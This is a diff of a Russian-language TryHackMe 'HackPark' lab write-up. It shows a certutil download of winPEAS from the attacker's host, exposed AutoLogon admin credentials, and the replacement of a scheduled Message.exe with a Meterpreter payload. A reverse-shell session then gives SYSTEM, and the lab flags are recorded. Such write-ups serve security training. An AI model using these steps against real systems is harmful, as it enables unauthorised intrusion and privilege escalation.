@@ -247,40 +247,120 @@ certutil -urlcache -f http://10.21.104.16:8888/winPEASx64.exe winPEASany.exe
 ![x_service](screenshots/02.service.png)
 
 Среди прочего
-```powershell
-    Some AutoLogon credentials were found
-    DefaultUserName               :  administrator
-    DefaultPassword               :  4q6XvFES7Fdxs
-```
-
 ```bash
     Some AutoLogon credentials were found
     DefaultUserName               :  administrator
     DefaultPassword               :  4q6XvFES7Fdxs
 ```
 
+Перехожу в 
+```
+meterpreter > ls
+Listing: c:\Program Files (x86)\SystemScheduler
+===============================================
+
+Mode              Size     Type  Last modified              Name
+----              ----     ----  -------------              ----
+040777/rwxrwxrwx  4096     dir   2025-07-04 10:20:34 -0400  Events
+100666/rw-rw-rw-  60       fil   2019-08-04 07:36:42 -0400  Forum.url
+100666/rw-rw-rw-  9813     fil   2004-11-16 02:16:34 -0500  License.txt
+100666/rw-rw-rw-  1496     fil   2025-07-04 08:27:30 -0400  LogFile.txt
+100666/rw-rw-rw-  3760     fil   2025-07-04 08:28:01 -0400  LogfileAdvanced.txt
+100777/rwxrwxrwx  536992   fil   2018-03-25 13:58:56 -0400  Message.exe
+100777/rwxrwxrwx  445344   fil   2018-03-25 13:59:00 -0400  PlaySound.exe
+100777/rwxrwxrwx  27040    fil   2018-03-25 13:58:58 -0400  PlayWAV.exe
+100666/rw-rw-rw-  149      fil   2019-08-04 18:05:19 -0400  Preferences.ini
+100777/rwxrwxrwx  485792   fil   2018-03-25 13:58:58 -0400  Privilege.exe
+100666/rw-rw-rw-  10100    fil   2018-03-24 15:09:04 -0400  ReadMe.txt
+100777/rwxrwxrwx  112544   fil   2018-03-25 13:58:58 -0400  RunNow.exe
+100777/rwxrwxrwx  235936   fil   2018-03-25 13:58:56 -0400  SSAdmin.exe
+100777/rwxrwxrwx  731552   fil   2018-03-25 13:58:56 -0400  SSCmd.exe
+100777/rwxrwxrwx  456608   fil   2018-03-25 13:58:58 -0400  SSMail.exe
+100777/rwxrwxrwx  1633696  fil   2018-03-25 13:58:52 -0400  Scheduler.exe
+100777/rwxrwxrwx  491936   fil   2018-03-25 13:59:00 -0400  SendKeysHelper.exe
+100777/rwxrwxrwx  437664   fil   2018-03-25 13:58:56 -0400  ShowXY.exe
+100777/rwxrwxrwx  439712   fil   2018-03-25 13:58:56 -0400  ShutdownGUI.exe
+100666/rw-rw-rw-  785042   fil   2006-05-16 19:49:52 -0400  WSCHEDULER.CHM
+100666/rw-rw-rw-  703081   fil   2006-05-16 19:58:18 -0400  WSCHEDULER.HLP
+100777/rwxrwxrwx  136096   fil   2018-03-25 13:58:58 -0400  WSCtrl.exe
+100777/rwxrwxrwx  68512    fil   2018-03-25 13:58:54 -0400  WSLogon.exe
+100666/rw-rw-rw-  33184    fil   2018-03-25 13:59:00 -0400  WSProc.dll
+100666/rw-rw-rw-  2026     fil   2006-05-16 18:58:18 -0400  WScheduler.cnt
+100777/rwxrwxrwx  331168   fil   2018-03-25 13:58:52 -0400  WScheduler.exe
+100777/rwxrwxrwx  98720    fil   2018-03-25 13:58:54 -0400  WService.exe
+100666/rw-rw-rw-  54       fil   2019-08-04 07:36:42 -0400  Website.url
+100777/rwxrwxrwx  76704    fil   2018-03-25 13:58:58 -0400  WhoAmI.exe
+100666/rw-rw-rw-  1150     fil   2007-05-17 16:47:02 -0400  alarmclock.ico
+100666/rw-rw-rw-  766      fil   2003-08-31 15:06:08 -0400  clock.ico
+100666/rw-rw-rw-  80856    fil   2003-08-31 15:06:10 -0400  ding.wav
+100666/rw-rw-rw-  1637972  fil   2009-01-08 22:21:48 -0500  libeay32.dll
+100777/rwxrwxrwx  40352    fil   2018-03-25 13:59:00 -0400  sc32.exe
+100666/rw-rw-rw-  766      fil   2003-08-31 15:06:26 -0400  schedule.ico
+100666/rw-rw-rw-  355446   fil   2009-01-08 22:12:34 -0500  ssleay32.dll
+100666/rw-rw-rw-  6999     fil   2019-08-04 07:36:42 -0400  unins000.dat
+100777/rwxrwxrwx  722597   fil   2019-08-04 07:36:32 -0400  unins000.exe
+100666/rw-rw-rw-  6574     fil   2009-06-26 20:27:32 -0400  whiteclock.ico
+```
+
+И читаю логи, нахожу Message.exe, который запускается каждые 30 секунд
+```
+meterpreter > cd Events
+meterpreter > ls
+Listing: c:\Program Files (x86)\SystemScheduler\Events
+======================================================
+
+Mode              Size   Type  Last modified              Name
+----              ----   ----  -------------              ----
+100666/rw-rw-rw-  1927   fil   2025-07-04 10:21:33 -0400  20198415519.INI
+100666/rw-rw-rw-  33158  fil   2025-07-04 10:21:33 -0400  20198415519.INI_LOG.txt
+100666/rw-rw-rw-  290    fil   2020-10-02 17:50:12 -0400  2020102145012.INI
+100666/rw-rw-rw-  186    fil   2025-07-04 10:21:15 -0400  Administrator.flg
+100666/rw-rw-rw-  182    fil   2025-07-04 10:21:12 -0400  SYSTEM_svc.flg
+100666/rw-rw-rw-  0      fil   2025-07-04 08:28:01 -0400  Scheduler.flg
+100666/rw-rw-rw-  449    fil   2025-07-04 10:21:15 -0400  SessionInfo.flg
+100666/rw-rw-rw-  0      fil   2025-07-04 10:21:31 -0400  service.flg
+
+meterpreter > cat 20198415519.INI_LOG.txt
+08/04/19 15:06:01,Event Started Ok, (Administrator)
+08/04/19 15:06:30,Process Ended. PID:2608,ExitCode:1,Message.exe (Administrator)
+08/04/19 15:07:00,Event Started Ok, (Administrator)
+08/04/19 15:07:34,Process Ended. PID:2680,ExitCode:4,Message.exe (Administrator)
+08/04/19 15:08:00,Event Started Ok, (Administrator)
+08/04/19 15:08:33,Process Ended. PID:2768,ExitCode:4,Message.exe (Administrator)
+08/04/19 15:09:00,Event Started Ok, (Administrator)
+08/04/19 15:09:34,Process Ended. PID:3024,ExitCode:4,Message.exe (Administrator)
+08/04/19 15:10:00,Event Started Ok, (Administrator)
+08/04/19 15:10:33,Process Ended. PID:1556,ExitCode:4,Message.exe (Administrator)
+```
+
+Загружаю **meter-5555.exe** в **c:\Program Files (x86)\SystemScheduler\** вместо **Message.exe** и получаю SYSTEM
+```
+meterpreter > upload /home/kali/Labs/TryHackMe/Win\ Medium\ -\ HackPark/exploits/meter-5555.exe
+meterpreter > mv Message.exe Message.bak
+meterpreter > mv meter-5555.exe Message.exe
+meterpreter > exit
+[*] Shutting down session: 1
+
+[*] 10.10.50.38 - Meterpreter session 1 closed.  Reason: User exit
+msf6 exploit(multi/handler) > run
+
+[*] Started reverse TCP handler on 10.21.104.16:5555 
+[*] Sending stage (176198 bytes) to 10.10.50.38
+[*] Meterpreter session 2 opened (10.21.104.16:5555 -> 10.10.50.38:49394) at 2025-07-04 10:50:06 -0400
+
+meterpreter > shell
+Process 2620 created.
+Channel 1 created.
+Microsoft Windows [Version 6.3.9600]
+(c) 2013 Microsoft Corporation. All rights reserved.
+
+C:\PROGRA~2\SYSTEM~1>
+```
+
 
 ## 🏁 Флаги
 
-- User flag: 
-- Root flag: 
+- User flag: 759bd8af507517bcfaede78a21a73e39 
+- Root flag: 7e13d97f05f7ceb9881a3eb3d78d3e72 
 
 ---
-
-## 📋 Резюме
-
-🧰 **Инструменты:**
-  - nmap, ffuf, и др.
-
-🚨 **Уязвимости, которые удалось обнаружить:**  
-  - Directory Traversal  
-  - RCE через уязвимый скрипт  
-
-🛡 **Советы по защите:**
-  - Использовать сложные пароли и ограничить число попыток входа
-  - Обновлять ПО до актуальных версий
-  - Удалять/ограничивать использование SUID-бинарников
-  - Настроить логирование и мониторинг системных событий
-  - Применять принцип наименьших привилегий
-
-
